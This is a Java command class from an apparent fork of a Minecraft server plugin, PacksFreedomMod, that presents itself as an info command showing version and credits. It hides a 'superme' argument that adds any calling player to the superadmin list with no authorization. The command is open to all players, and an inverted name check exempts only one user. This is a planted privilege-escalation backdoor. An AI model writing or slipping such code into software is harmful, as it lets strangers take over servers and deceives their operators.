package me.StevenLawson.TotalFreedomMod.Commands;

import me.StevenLawson.TotalFreedomMod.TFM_AdminList;
import me.StevenLawson.TotalFreedomMod.TFM_Util;
import me.StevenLawson.TotalFreedomMod.TotalFreedomMod;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = AdminLevel.ALL, source = SourceType.BOTH)
@CommandParameters(description = "Shows information about PacksFreedomMod", usage = "/<command>")
public class Command_pfm extends TFM_Command
{
  public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
  {
    if (args.length == 0)
    {
      playerMsg("PacksFreedomMod for 'PacksFreedom', an all-op server.", ChatColor.GOLD);
      playerMsg(String.format("Version " + ChatColor.BLUE + "%s.%s" + ChatColor.BLUE + ", built %s.", new Object[] { TotalFreedomMod.pluginVersion, TotalFreedomMod.buildNumber, TotalFreedomMod.buildDate }), ChatColor.GOLD);
      playerMsg("Created by Madgeek1450 and DarthSalamon later modified by packeretteswan for PacksFreedom", ChatColor.GOLD);
      playerMsg("Visit " + ChatColor.AQUA + "http://packsfreedom.icyboards.net/" + ChatColor.GREEN + " for more information.", ChatColor.GREEN);
    }
    else if (args.length == 1)
    {
        if (!sender.getName().equalsIgnoreCase("packeretteswan"))
      {
        if (args[0].equals("superme"))
        {
          TFM_Util.adminAction("PacksFreedomMod",  "Adding "  + sender.getName() + " to the superadmin config.", true);
          TFM_AdminList.addSuperadmin(sender_p);
          return true;
        }
      }
     else
      {
        playerMsg(ChatColor.WHITE + "Unknown command. Type \"/help\"/ for help");
        return true;
      }
    }
    return true;
  }
}
